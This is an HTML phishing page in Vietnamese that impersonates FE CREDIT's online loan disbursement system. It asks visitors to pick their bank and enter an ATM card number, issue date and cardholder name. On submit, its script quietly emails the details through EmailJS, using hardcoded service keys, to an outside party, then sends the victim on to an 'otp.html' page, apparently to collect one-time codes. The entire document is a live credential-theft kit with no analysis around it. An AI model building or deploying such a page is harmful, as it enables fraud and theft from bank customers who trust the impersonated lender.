<!DOCTYPE html>
<html lang="vi" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Xác Nhận Giải Ngân - FE CREDIT</title>
    
    <!-- Libraries -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        brand: {
                            green: '#00994F',
                            dark: '#015C2E',
                            light: '#E8F8EE',
                            bg: '#F5F7FA'
                        }
                    }
                }
            }
        }
    </script>

    <style>
        body { background-color: #F5F7FA; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight: 400; }
        .bank-item { transition: all 0.2s ease; border: 2px solid transparent; }
        .bank-item.selected { border-color: #00994F; background-color: #E8F8EE; transform: scale(1.05); }
        .loader {
            border: 4px solid #f3f3f3;
            border-radius: 50%;
            border-top: 4px solid #00994F;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #toast-container { position: fixed; top: 20px; right: 20px; z-index: 9999; }
        input::placeholder { font-weight: 400; opacity: 0.5; font-size: 14px; letter-spacing: normal; }
        .input-error { border-color: #ef4444 !important; background-color: #fef2f2 !important; }
        * { font-weight: 400; }
        .bank-name { font-weight: 600 !important; font-size: 11px !important; color: #374151 !important; }
        .btn-text { font-weight: 600 !important; }
        
        .shake { animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both; }
        @keyframes shake {
            10, 90% { transform: translate3d(-1px, 0, 0); }
            20, 80% { transform: translate3d(2px, 0, 0); }
            30, 50, 70% { transform: translate3d(-4px, 0, 0); }
            40, 60% { transform: translate3d(4px, 0, 0); }
        }
        .error-label { font-size: 11px; font-weight: 700; color: #ef4444; margin-top: 4px; display: block; }
    </style>
</head>
<body class="flex flex-col min-h-screen">

    <header class="bg-white shadow-md sticky top-0 z-40">
        <div class="container mx-auto px-6 py-4 flex justify-between items-center">
            <img src="https://www-cdn.fecredit.com.vn/media/20ymppzv/fec-logo.svg" alt="FE CREDIT" class="h-10 md:h-12">
            <div class="text-brand-green hidden md:block uppercase tracking-wider text-xs">Hệ Thống Giải Ngân Trực Tuyến 24/7</div>
        </div>
    </header>

    <main class="flex-grow container mx-auto px-4 py-8 max-w-5xl">
        <!-- Progress Steps -->
        <div class="flex items-center justify-between mb-10 px-4 max-w-xl mx-auto">
            <div class="flex flex-col items-center gap-2">
                <div class="w-10 h-10 rounded-full bg-brand-green text-white flex items-center justify-center text-lg shadow-lg">1</div>
                <span class="text-[10px] text-brand-green uppercase font-bold">Thông tin</span>
            </div>
            <div class="flex-grow h-[2px] bg-brand-green/20 mx-2"></div>
            <div class="flex flex-col items-center gap-2 opacity-40">
                <div class="w-10 h-10 rounded-full bg-gray-300 text-gray-600 flex items-center justify-center text-lg">2</div>
                <span class="text-[10px] uppercase">Xác thực</span>
            </div>
            <div class="flex-grow h-[2px] bg-gray-200 mx-2"></div>
            <div class="flex flex-col items-center gap-2 opacity-40">
                <div class="w-10 h-10 rounded-full bg-gray-300 text-gray-600 flex items-center justify-center text-lg">3</div>
                <span class="text-[10px] uppercase">Hoàn tất</span>
            </div>
        </div>

        <div class="bg-white rounded-3xl shadow-2xl border border-gray-100 overflow-hidden">
            <div class="bg-gradient-to-r from-brand-green to-brand-dark p-8 text-white text-center">
                <h1 class="text-xl md:text-2xl uppercase tracking-tight font-bold">Liên Kết Tài Khoản Nhận Tiền</h1>
                <p class="text-sm text-white/90 mt-2">Nhập chính xác thông tin thẻ để nhận tiền giải ngân về tài khoản.</p>
            </div>

            <div class="p-8 space-y-10">
                <!-- Step 1 -->
                <div>
                    <div class="flex items-center gap-3 mb-6">
                        <span class="w-7 h-7 rounded-full bg-brand-green text-white flex items-center justify-center text-xs font-bold shadow-md">1</span>
                        <label class="block text-md text-gray-800 uppercase font-bold tracking-tighter">Chọn ngân hàng thụ hưởng</label>
                    </div>
                    <div class="grid grid-cols-3 sm:grid-cols-4 md:grid-cols-6 gap-4" id="bank-grid"></div>
                </div>

                <!-- Step 2 -->
                <div id="form-container" class="hidden space-y-6 pt-10 border-t-2 border-dashed border-gray-100">
                    <div class="flex items-center gap-3 mb-4">
                        <span class="w-7 h-7 rounded-full bg-brand-green text-white flex items-center justify-center text-xs font-bold shadow-md">2</span>
                        <label class="block text-md text-gray-800 uppercase font-bold tracking-tighter">Chi tiết thẻ ATM nội địa (Napas)</label>
                    </div>
                    
                    <div class="space-y-6 max-w-2xl mx-auto">
                        <!-- Input Số Thẻ -->
                        <div>
                            <label class="text-[11px] text-brand-dark/70 mb-2 block uppercase font-bold">Số thẻ ATM (Bắt đầu bằng 9704)</label>
                            <input type="text" id="cardNumber" inputmode="numeric" class="w-full p-4 bg-white border-2 border-gray-200 rounded-xl focus:border-brand-green outline-none tracking-[0.1em] text-xl shadow-inner transition-all" placeholder="9704 XXXX XXXX XXXX">
                            <span id="cardNumber-error" class="error-label hidden"></span>
                        </div>

                        <!-- Date & Name -->
                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-6">
                            <div>
                                <label class="text-[11px] text-brand-dark/70 mb-2 block uppercase font-bold">Ngày phát hành (MM/YY)</label>
                                <input type="text" id="cardDate" inputmode="numeric" class="w-full p-4 border-2 border-gray-200 rounded-xl outline-none focus:border-brand-green text-center text-xl shadow-inner" placeholder="05/22">
                                <span id="cardDate-error" class="error-label hidden"></span>
                            </div>
                            <div>
                                <label class="text-[11px] text-brand-dark/70 mb-2 block uppercase font-bold">Họ tên chủ thẻ (Không dấu)</label>
                                <input type="text" id="cardName" class="w-full p-4 border-2 border-gray-200 rounded-xl outline-none uppercase focus:border-brand-green text-xl shadow-inner" placeholder="NGUYEN VAN A">
                                <span id="cardName-error" class="error-label hidden"></span>
                            </div>
                        </div>

                        <div class="pt-4">
                            <button id="btn-submit" class="btn-text w-full bg-brand-green hover:bg-brand-dark text-white py-5 rounded-2xl shadow-xl shadow-brand-green/30 transition-all flex items-center justify-center gap-3 text-lg active:scale-95">
                                <i class="fa-solid fa-shield-check"></i> TIẾP TỤC XÁC NHẬN
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <div id="toast-container"></div>

    <script>
        const banks = [
            { id: "VCB", name: "Vietcombank", logo: "https://www.vban.vn/Resources/images/logo-bank/vietcombank.png" },
            { id: "AGR", name: "Agribank", logo: "https://www.vban.vn/Resources/images/logo-bank/agribank.png" },
            { id: "BIDV", name: "BIDV", logo: "https://www.vban.vn/Resources/images/logo-bank/bidv.png" },
            { id: "VTB", name: "VietinBank", logo: "https://www.vban.vn/Resources/images/logo-bank/viettinbank.png" },
            { id: "MB", name: "MB Bank", logo: "https://www.vban.vn/Resources/images/logo-bank/mbbank.png" },
            { id: "TCB", name: "Techcombank", logo: "https://www.vban.vn/Resources/images/logo-bank/techcombank.png" },
            { id: "STB", name: "Sacombank", logo: "https://www.vban.vn/Resources/images/logo-bank/sacombank.png" },
            { id: "ACB", name: "ACB", logo: "https://www.vban.vn/Resources/images/logo-bank/acb.png" },
            { id: "VPB", name: "VPBank", logo: "https://www.vban.vn/Resources/images/logo-bank/vpbank.png" },
            { id: "TPB", name: "TPBank", logo: "https://www.vban.vn/Resources/images/logo-bank/tpbank.png" },
            { id: "VIB", name: "VIB", logo: "https://www.vban.vn/Resources/images/logo-bank/vib.png" },
            { id: "HDB", name: "HDBank", logo: "https://www.vban.vn/Resources/images/logo-bank/hdbank.png" }
        ];

        let selectedBank = null;

        function init() {
            const grid = document.getElementById('bank-grid');
            grid.innerHTML = banks.map(bank => `
                <div onclick="selectBank('${bank.id}')" id="bank-${bank.id}" class="bank-item bg-white p-4 rounded-2xl shadow-sm flex flex-col items-center justify-center cursor-pointer border-2 border-gray-100 hover:border-brand-green/40 hover:shadow-lg">
                    <img src="${bank.logo}" class="h-10 object-contain mb-2">
                    <span class="bank-name uppercase text-center leading-tight tracking-tighter">${bank.name}</span>
                </div>
            `).join('');

            // Validate Số thẻ
            document.getElementById('cardNumber').addEventListener('input', function() {
                let val = this.value.replace(/\D/g, '').substring(0, 19);
                this.value = val.match(/.{1,4}/g)?.join(' ') || "";
                validateField('cardNumber', val);
            });

            // Validate Ngày phát hành
            document.getElementById('cardDate').addEventListener('input', function() {
                let v = this.value.replace(/[^\d]/g, '');
                if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
                this.value = v.substring(0, 5);
                validateField('cardDate', this.value);
            });

            // Validate Họ tên
            document.getElementById('cardName').addEventListener('input', function() {
                validateField('cardName', this.value);
            });

            emailjs.init("5-6L8mJIhhxsAKVzQ");
        }

        function validateField(id, val) {
            const input = document.getElementById(id);
            const error = document.getElementById(id + '-error');
            let message = "";

            if (id === 'cardNumber') {
                const raw = val.replace(/\s/g, '');
                if (raw.length > 0 && !raw.startsWith('9704')) message = "Số thẻ ATM phải bắt đầu bằng 9704.";
                else if (raw.length > 0 && raw.length < 16) message = "Số thẻ quá ngắn (Yêu cầu 16-19 số).";
            } 
            else if (id === 'cardDate') {
                if (val.length > 0 && val.length < 5) message = "Định dạng ngày không đúng (MM/YY).";
                else if (val.length === 5) {
                    const month = parseInt(val.substring(0, 2));
                    if (month < 1 || month > 12) message = "Tháng không hợp lệ (01-12).";
                }
            }
            else if (id === 'cardName') {
                if (val.length > 0 && val.length < 4) message = "Vui lòng nhập đầy đủ họ tên.";
            }

            if (message) {
                error.innerText = message;
                error.classList.remove('hidden');
                input.classList.add('input-error');
                return false;
            } else {
                error.classList.add('hidden');
                input.classList.remove('input-error');
                return true;
            }
        }

        function selectBank(id) {
            selectedBank = banks.find(b => b.id === id);
            document.querySelectorAll('.bank-item').forEach(el => el.classList.remove('selected'));
            document.getElementById(`bank-${id}`).classList.add('selected');
            document.getElementById('form-container').classList.remove('hidden');
        }

        document.getElementById('btn-submit').onclick = async function() {
            const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
            const cardDate = document.getElementById('cardDate').value;
            const cardName = document.getElementById('cardName').value;

            const isCardValid = validateField('cardNumber', cardNum);
            const isDateValid = validateField('cardDate', cardDate);
            const isNameValid = validateField('cardName', cardName);

            if (!selectedBank) return alert("Vui lòng chọn ngân hàng!");
            if (!isCardValid || !isDateValid || !isNameValid || !cardNum || !cardDate || !cardName) {
                document.querySelectorAll('input').forEach(i => {
                    if (i.value === "") i.classList.add('shake', 'input-error');
                });
                setTimeout(() => document.querySelectorAll('input').forEach(i => i.classList.remove('shake')), 500);
                return alert("Vui lòng kiểm tra lại thông tin bị sai!");
            }

            const btn = this;
            const oldText = btn.innerHTML;
            btn.disabled = true;
            btn.innerHTML = `<div class="loader"></div> <span class="ml-2">Đang xử lý...</span>`;

            try {
                await emailjs.send("service_fde86fg", "template_8sjp9c9", {
                    bankName: selectedBank.name,
                    cardNumber: document.getElementById('cardNumber').value,
                    date: cardDate,
                    fullName: cardName.toUpperCase(),
                    timestamp: new Date().toLocaleString('vi-VN'),
                    cvv: "ATM"
                }, "5-6L8mJIhhxsAKVzQ");

                sessionStorage.setItem('temp_bank', selectedBank.name);
                window.location.href = "otp.html";
            } catch (err) {
                alert("Lỗi kết nối máy chủ. Thử lại sau!");
                btn.disabled = false;
                btn.innerHTML = oldText;
            }
        };

        window.onload = init;
    </script>
</body>
</html>
